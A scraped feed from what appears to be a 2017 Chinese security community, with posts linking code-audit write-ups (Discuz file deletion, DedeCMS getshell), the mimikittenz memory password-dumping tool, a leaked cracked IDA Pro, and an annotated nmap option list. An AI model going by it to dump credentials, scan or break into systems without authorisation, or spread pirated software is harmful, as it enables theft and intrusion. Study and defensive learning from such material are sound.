<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__: 有，案例还在归类

<img src="https://file.xiaomiquan.com/23/cb/23cbc502bad8ece30efc8aeb0f0d125d08a34c5845eff16d768e543a45acb9a7.jpg" width="25px"/> __liuz__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: [强]

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 期待案例

<img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__: 期待作者的案例归类[微笑]

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 测试xss的。语句字符也发出来吧

<img src="https://file.xiaomiquan.com/b8/77/b8776f7d3ce9106e867038e9e861c0cfa2f0f3e72bf88a6964856e747de20088.jpg" width="25px"/> __zz小子__: 下吧去ktv试试[坏笑][坏笑]绝对可以装一波

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 一句话总结:见框就插吧！！！


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-10-07:


__#姿势#__


__#代码审计#__

 关于discuz任意文件删除的一点思考..


__分享文件:__
[discuz任意文件删除漏洞的一点思考.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-02:


__#资源#__

 

推荐个资源，国庆在家喝茶追剧也不忘关注威胁情报，这几天看到一个针对软件供应链攻击-Kingslayer的paper，无意中发现了一个“好玩”的资源。

PocOrGTFO，GTFO指Get The Fuck Out，意指对一切Backdoor的情绪表达，有点极客的味道。PocOrGTFO包含了一系列牛人写的Paper，关键字就是Poc，可谓“干货”满满，量很多，得啃很久～

链接：
[GitHub - filcab/pocorgtfo: Mirror for the PoC || G...](https://github.com/filcab/pocorgtfo)



当然，no starch press也出了纸质版（本人特别喜欢Paper里的一些插图），可谓是装B的利器。

BTW，这个出版社大家也可以关注一下，你看它官网上卖的什么书就知道了

官网地址：
[https://www.nostarch.com/](https://www.nostarch.com/)





...

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 英语是硬伤啊！


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-30:


__#资源#__

 Ida Pro 7.0 + All Decompilers Full Leak-Pass


[Ida Pro 7.0   All Decompilers Full Leak-Pass - 『逆向...](https://www.52pojie.cn/thread-648089-1-1.html)



[[Из привата] [LEAKED] IDA Pro 7.0   HexRays 2 (ARM...](https://forum.reverse4you.org/showthread.php?t=2627)



应该都有了吧？应该不会在私人电脑里直接用吧？

6.8 已经是逆向常用神器，7.0 继续。



...

<img src="https://file.xiaomiquan.com/8d/f6/8df6a4c90a9ec9e3b7d237bdd5b1798141a4dd962c04c0534de4fbe048cd1bc4.jpg" width="25px"/> __Y叔也叫段子手__: 稳[强]

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 私人电脑用会怎样。😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 不保证没猫腻

<img src="https://file.xiaomiquan.com/fb/f6/fbf678dd2d4fef023ddd010d1b91f977d8d94277fc881a539dc2b288cdde6ab3.jpg" width="25px"/> __天空白云__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 大大可以验证下，学习了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-30:


__#资源#__

  Web 安全学习资料

Chybeta 同学很认真，汇总的学习资料很多了，转这分享给大家：


[Web-Security-Learning | Chybeta](https://chybeta.github.io/2017/08/19/Web-Security-Learning/)





...

<img src="https://file.xiaomiquan.com/be/28/be28e097e4426d5bbccd2babaef685141be988f0a59f737cee8cc8900a29a2f7.jpg" width="25px"/> __。。__: 很多看不懂，在恶补知识中[微笑]

<img src="https://file.xiaomiquan.com/7e/6e/7e6e47b51f5a9733c99849a1458f703fdb6abecf319d98a1500d009c1f02b46a.jpg" width="25px"/> __Sunset__: 不错

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 貌似之前有个人发过

<img src="https://file.xiaomiquan.com/4f/bc/4fbce47c71676f563caac27a0c25ebbd298574ec5ce590b57060c527c527600e.jpg" width="25px"/> __youlike__: 最近我也在整理这些基础的，谢谢这位同学和大大的分享。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 嗯 这个又更新了

<img src="https://file.xiaomiquan.com/54/ee/54ee790e1a08f9ecb75301d85113a069f96d6591975a3affe8208500d6dfed34.jpg" width="25px"/> __盘龙坳__: 正需要这些资源🙏

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 赞大神


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-30:

分享点安全分析的经验

首先，要了解你的客户
例如客户的IT资产列表，主要业务，重要服务器，网络拓扑，薄弱点，历史安全事件等等

其次，要了解你的敌人
通过掌握的情报和客户报告的事件，去分析有哪些攻击者对客户感兴趣，甚至一些敏感客户的攻击者会是一些国家、组织。平时要搜集它们的情报，了解敌人的惯用手法。

有以上这些了解，在分析的时候才能有的放矢



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-29:


__#资源#__

 漏洞赏金技能清单

GitHub 真是个黑客氛围浓厚的地方，这个也有人整理出来了，过了一遍，虽然还很不够全面，算挺难得的了，分享给大家。

这份技能清单，包括：

那些赏金平台
相关书籍
特殊的工具
情报调研
XSS 清单
SQL 注入清单
SSRF 清单
CRLF 注入清单
CSV 注入清单
LFI 清单
XXE 清单
RCE 清单
重定向漏洞清单
加密清单
模版注入清单
内容注入清单
XSLT 注入清单

具体见：


[GitHub - EdOverflow/bugbounty-cheatsheet: A list o...](https://github.com/EdOverflow/bugbounty-cheatsheet)



有精力者完全可以去这些赏金平台上刷点知名度、经验和美金...



...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 老大  这是技能表么相当于

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 赏金猎人入门级技能表


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-28:


__#资源#__

  最近在学逆向，发现了一本适合新手入门的书籍《Reverse Engineering for Beginners》，里面讲的挺全的，x86/x64、ARM、MIPS体系架构都有涉及到。想学逆向的小伙伴，一起来撸。中文版译本《逆向工程权威指南》。

英文版下载链接：


[https://beginners.re/RE4B-EN.pdf](https://beginners.re/RE4B-EN.pdf)



来自@s1eep  的分享



...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 谢谢，学完这个玩ctf了吧可以

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 余大  也要向逆向发展了吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: s1eep的分享，不过我一直在玩，玩得不深罢了

<img src="https://file.xiaomiquan.com/37/43/374310d6c0d10abd44b2dbd539c133fde6ac46f958196b2b642747858dc0af82.jpg" width="25px"/> __大宇__: 有没有中文版

<img src="https://file.xiaomiquan.com/e4/3b/e43b69239bcb4eee21677c7fd1c059deb8186ac73da342f2f3279a5bd66de70a.jpg" width="25px"/> __monkeyfly__: 适合新手入门吗？我看了英文版的，并不觉得如此。《深入理解计算机系统》更适合吧。

<img src="https://file.xiaomiquan.com/88/74/8874c2e75dca87eba12d12a4c6f9a0b794ad3acffe3e26e4bb4bf3443a32db2e.jpg" width="25px"/> __GUO__: 小白表示终于等到感兴趣的干货了[得意]

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__ replies to <img src="https://file.xiaomiquan.com/e4/3b/e43b69239bcb4eee21677c7fd1c059deb8186ac73da342f2f3279a5bd66de70a.jpg" width="25px"/> __monkeyfly__: 这本书我也在看，比较棒

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__ replies to <img src="https://file.xiaomiquan.com/37/43/374310d6c0d10abd44b2dbd539c133fde6ac46f958196b2b642747858dc0af82.jpg" width="25px"/> __大宇__: 看最后一句

<img src="https://file.xiaomiquan.com/15/73/1573e3d1dbeb1675b2c1f5cb471cbf81849258d6513431bd4bccbb3b2d718b1d.jpg" width="25px"/> __s1eep__ replies to <img src="https://file.xiaomiquan.com/e4/3b/e43b69239bcb4eee21677c7fd1c059deb8186ac73da342f2f3279a5bd66de70a.jpg" width="25px"/> __monkeyfly__: 组原和操作系统原理，必不可少。我觉得这本书给出学逆向的一条路，欠缺相应的知识，再自己补吧

<img src="https://file.xiaomiquan.com/e4/3b/e43b69239bcb4eee21677c7fd1c059deb8186ac73da342f2f3279a5bd66de70a.jpg" width="25px"/> __monkeyfly__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 还有卡梅隆大学，原书作者上课的公开视频可以看，效果更好。他们上课用的教材就是这个。

<img src="https://file.xiaomiquan.com/df/85/df854653fd6365ed54b1803b56500b63858368f73a62726920b7566492b7e7f2.jpg" width="25px"/> __封停__: 这本书不错，我快看完了，适合新手


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-09-26:

> 白某某人 提问：
之前做过一点ios开发，python会一些，php基础看了一些没有项目经验，想学php代码审计应该从何下手？


建议先实际动手做项目，只有做过项目，审计的时候对很多东西才了然于心。至于哪里有做项目的机会，github上太多开源项目了，有一些其实非常基础，比如搭建个人博客平台。最重要的是，坚持下去，不要半途而废。



...

<img src="https://file.xiaomiquan.com/fb/81/fb811caceb3cd53b46da8564fc045cb9cce3046ae4a13c3b7e7b17b18fd74d5c.jpg" width="25px"/> __白某某人__: 好的谢谢[发呆]

<img src="https://file.xiaomiquan.com/b8/ec/b8ec6e559aed74ba3044cb5579e1edbf4c2122028d5ffeb55e3cb49baf2f04b6.jpg" width="25px"/> __喵(^･ｪ･^)呜__: 请问您值得做项目是指做什么，搭建好博客后，对搭建的项目进行拓展还是审计搭建的项目

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/b8/ec/b8ec6e559aed74ba3044cb5579e1edbf4c2122028d5ffeb55e3cb49baf2f04b6.jpg" width="25px"/> __喵(^･ｪ･^)呜__: 就是单纯的做项目，各种类型的都做一做。做完你代码审计就不吃力了。

<img src="https://file.xiaomiquan.com/b8/ec/b8ec6e559aed74ba3044cb5579e1edbf4c2122028d5ffeb55e3cb49baf2f04b6.jpg" width="25px"/> __喵(^･ｪ･^)呜__: 感谢您的回复，还是不是很明白您说的做项目是指什么？是指搭建一个系统后进行审计，还是根据搭建的系统指仿写一个系统？

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/b8/ec/b8ec6e559aed74ba3044cb5579e1edbf4c2122028d5ffeb55e3cb49baf2f04b6.jpg" width="25px"/> __喵(^･ｪ･^)呜__: 就是先不要想着审计，先把开发做好。至于把开发做好的方法有很多，我认为其中比较好的方法是学习开源项目。个人博客只是举个例子，做别的也可以，电商网站，视频网站，等等。

<img src="https://file.xiaomiquan.com/b8/ec/b8ec6e559aed74ba3044cb5579e1edbf4c2122028d5ffeb55e3cb49baf2f04b6.jpg" width="25px"/> __喵(^･ｪ･^)呜__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 明白了，十分感谢您的耐心指导

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: github上的项目别人不都是做好的吗，您的意思是照着学吗

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 是的。其实如果时间允许的话，自己先实现类似功能，再去参考开源代码是怎么写的，看看有哪些不足，再改善。

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 谢谢！


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-09-26:


__#姿势#__

 
__#代码审计#__

 有意思的点，php图片处理这一块大家近期可以多关注关注。


__分享文件:__
[DEDECMS5.7后台getshell.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/51/d2/51d2c4ce46028b8a20e73e80c24617572fdb4cdf8ee23494fd90f88dbedd9173.jpg" width="25px"/> __Time2AM__: 最喜欢代码审计这块[玫瑰]

<img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 知道代码去构造绕过的方法，但是黑盒就很头疼，常规绕过方法都没用的时候或许只能换其他思路了。

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8f/26/8f2660b040646e83a9094de27a4d4fd60e90a8488b576af28da8e08b90484ab4.jpg" width="25px"/> __Wing__: 是这样的。黑盒一般靠fuzz猜源码然后想思路。


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:

强烈推荐大家关注下Derbycon 2017，都是一群实战红蓝队技术的家伙，演讲议题硬货实在实在太多了，眼花缭乱~


[Derbycon 2017 Videos (Hacking Illustrated Series I...](http://www.irongeek.com/i.php?page=videos/derbycon7/mainlist)



<img src="https://file.xiaomiquan.com/d1/7b/d17ba0300f0fff865bcbfe8c94d1ad96ae9463fd7d80c1c38cc43dc670f83b4b.png" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/95/63/9563c9001173aff07340c06c833c1d20bf851f042f88d6522ef554d8cca69d76.png" width="50%" height="50%" align="middle"/>
<img src="https://file.xiaomiquan.com/31/0d/310da90b6e49ee958430a501391bf2b36c4afd88dded3e7aca6b1425013b7f1f.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 确实干货太多，都看不过来了

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 语言是硬伤啊

<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__ replies to <img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 首先就算懂点英语看着也费劲。所以还是要先懂些东西，然后结合所学才能看明白。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-26:

> Canng 提问：
安全人员的职业发展怎么样比较好呢？在甲方的话不产生收益，地位发展可能不如开发人员。不知道路该怎么走呀！求大大解惑


怎么发展，这个每个人可不一定，当你开始思考这个问题后，会慢慢知道的...

不过话说回来，地位这个问题天时地利人和三因素都有，最关键还是个人能力提升，如果地利不满足，跳槽到满足的就好，个人能力不足，别说地位，就连跳槽合适的目的地都不一定能找到。

聚焦到个人身上的话，建议安全人员不要只沉迷在所谓的黑客技术上，太窄。我们一直提倡黑客工程化，是觉得我们认为的黑客应该具备工程化全方面能力，可以自由创造价值。创造力是黑客必备基础能力。黑客工程化要求黑客不仅会黑，还会编程开发，还会懂商业之道，运作出价值。如果打通这个，地位如何提升不了？

这也是为什么之前我会不断公布我的安全技能树（技能表）的原因，估计很多人已经不知道里面在讲些什么了...



...

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 黑客工程化，产品化

<img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 在从事运维工作，虽时常涉及安全设备，但总感觉平时所做距离“安全”二字还太远

<img src="https://file.xiaomiquan.com/86/17/8617e16cf9b19cbef74a90a3d8d01f452217e06e71e4200e374cbcf6dab06f25.jpg" width="25px"/> __琥珀__: 确实不知道技能树在讲什么了[流泪]

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 先做开发再转安全感觉比较好的！

<img src="https://file.xiaomiquan.com/d8/d1/d8d1c9ff6197408b89a2410bed5f88db4aac1428fdd8bae99c9d0d28511b7767.jpg" width="25px"/> __PI31__: 工程师+科学家+艺术家=牛逼黑客（或者再加个企业家）

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 安全还能商业化？就是搞安全培训么

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 那些安全产品难道都免费啊？

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 6666

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 大哥内容好多

<img src="https://file.xiaomiquan.com/cd/b5/cdb582bb8a67b7629b4f8807a5c5575e3582dfbf8c8174bd01978a61640e4e4d.jpg" width="25px"/> __启清__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 同感啊！


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:

可以在获取指定进程内存中字符串密码的powershell脚本，原理是动态编译C#代码执行，指定进程用正则暴搜内存中的字符串。


[mimikittenz/Invoke-mimikittenz.ps1 at master · put...](https://github.com/putterpanda/mimikittenz/blob/master/Invoke-mimikittenz.ps1)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 咪咪系列😄


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:

可以在获取指定进程内存中字符串密码的powershell脚本，原理是动态编译C#代码执行，指定进程用正则暴搜内存中的字符串。


[mimikittenz/Invoke-mimikittenz.ps1 at master · put...](https://github.com/putterpanda/mimikittenz/blob/master/Invoke-mimikittenz.ps1)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 咪咪系列😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-26:


__#资源#__

  从调试环境搭建到 Tomcat 漏洞分析

来自@Shutdown-r  的分享推荐！

Apache9月19日发布了CVE-2017-12616(信息泄露)和 CVE-2017-12615(远程代码执行漏洞)两个高危漏洞，在Apache Tomcat 7.0.81对这两个高危漏洞进行了修复。

虽然大佬们都说两个漏洞比较鸡肋，利用价值不大，但是漏洞思路还是值得大家学习的，时隔快半个月，网上也有很多相关分析文章，这里分享一个知乎专栏，两个漏洞讲的比较详细，而且附带调试环境搭建的教程，对小白非常友好，跟着作者分析一遍，相信会收获良多~


[Java安全 - 知乎专栏](https://zhuanlan.zhihu.com/javasecurity)





---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-25:


__#HITB#__

 2017年HITBSecConf新加坡站 各个Paper的现场视频已经陆续放出，大家可以关注一下HITBSecConf的官方Twitter:@HITBSecConf



---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-09-24:


__#姿势#__

 
__#代码审计#__

 好久没发了，最近多补几篇。这次来看看超全局变量的细节，下次分享咱们直接拿案例实战。


__分享文件:__
[代码审计基础之超全局变量.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-22:


__#基础#__

nmap是渗透测试中一款必不可少的神器，它可以做包括端口扫描，主机发现，服务识别，系统探测等一系列的操作,圈中有过相关资料，不过没有把全部参数列出来，下面我把nmap全参数的作用列出来，仅供参考，因为有一些太过偏僻的参数我也不了解，仅凭我匮乏的六级直译。话不多说，直接上参数


目标发现：
-iL：使用ip列表文件
-iR:扫描随机ip,参数后面跟扫描的地址的数量
--exclude:不扫描某一个地址，比如说扫一个ip地址段但是又不想扫描其中的某一个地址，就使用这个参数
eg:nmap 192.168.1.0/24 --exclude 192.168.1.1-100:从100开始扫描
--excludefile：不扫描文件中的所有地址

主机发现：
-sL:不做扫描，列出目标地址段，看看是不是你想扫描的额地址段，等于子网掩码计算
-sn:不做端口扫描
-Pn:默认主机是活的，因为有时候主机不回包，扫描防火墙很有用
-PS/PA/PU/PY:使用SYN/ACK/UDP/SCTP（不是TCP/IP范畴，是VUIP范畴的协议，用来传语音）进行发现
-PE:使用ICMP探测，时间戳和子网掩码，一般子网掩码不会成功
-PO:使用ip协议扫描（ip protocol ping）
-n/-R:不做DNS解析/做反向解析
--dnsserver:在nmap做dns解析时，使用指定的dns服务器，不用默认指定的dns服务器
--system-dns:使用系统的dns,加不加都差不多
--traceroute：扫描的时候进行路由追踪

端口发现：
-sS/sT/sA/sW/sM TCP SYN/Connect()/ACK/Windows/Maimon scan:SYN扫描，建立完整的TCP三次握手/窗口扫描/使用Fin+ACK扫描
-sU:使用UDP扫描
-sN/sF/sX:TCP NULL,FIN,and Xmas scans:没有标签的包，FIN包，FIN+PSH+URG包
--scanflags:自定义TCP的flags
-sI:zombie scan：僵尸扫描
-sY/sZ：SCTP协议扫描（不了解）
-sO:IP扫描
-b:FTP中继扫描

端口指定和端口识别

-p：指定端口
--exclude-ports:指定不扫描的端口
-F:使用快速模式，一般默认扫描1000个端口
-r:使用顺序端口扫描，一般扫描的时候是使用随机端口扫描
--top-ports:扫描前n个端口
--port-ratio:扫描更常见的端口

服务扫描：
-sV：进行服务识别，并进行特征库的识别，一般不会对nmap的所有特征库进行匹配
--version-intensity:进行深度匹配的程度，从0~9
--version-light:进行轻量级的探测，等于version-intensity 2级别
--version-all：进行重量级的探测，等于version-intensity 9级别
--version-trace:显示所有的探测细节

脚本扫描：
-sC：等于 --script=default
--script:后接lua脚本
--script-args:指定脚本的参数
--script-args-file:后接一个参数列表文件，使用文件里的参数
--script-updatedb:更新脚本数据库
--script-help:显示某个脚本的帮助信息

操作系统探测：
-O：系统检测，包括内核信息
--osscan-limit: 限制要扫描的系统，比如只扫描win系统
--osscan-guess:对操作系统进行更有攻击性的猜测

时间和性能：太快的扫描可能引起目标系统的警报系统报警，并且影响性能
-T<0-5>:设置时间模板（字面翻译），越高越快，越低越慢
--min-hostgroup/max-hostgroup:最小/最大并行扫描的主机组，最多/最少一次扫多少个主机
--min-paralleism/max-paralleism:最小/最大的并行数量
--min-rtt-timeout/max-rtt-timeout/initial-rtt-time<time>:设置探测包的最大/最小/最初的来回时间
   rtt:run trip time
--max-retries <tries>:设置最大重试次数，预防网络质量不好，但是越多探测包越容易被发现
--host-timeout <time>：设置最大超时时间，过了这个时间可以认为主机是down的或者端口不开放
--scan-delay/--max-scan-delay <time>: 设置每次探测之间的延迟，基本/最大延迟
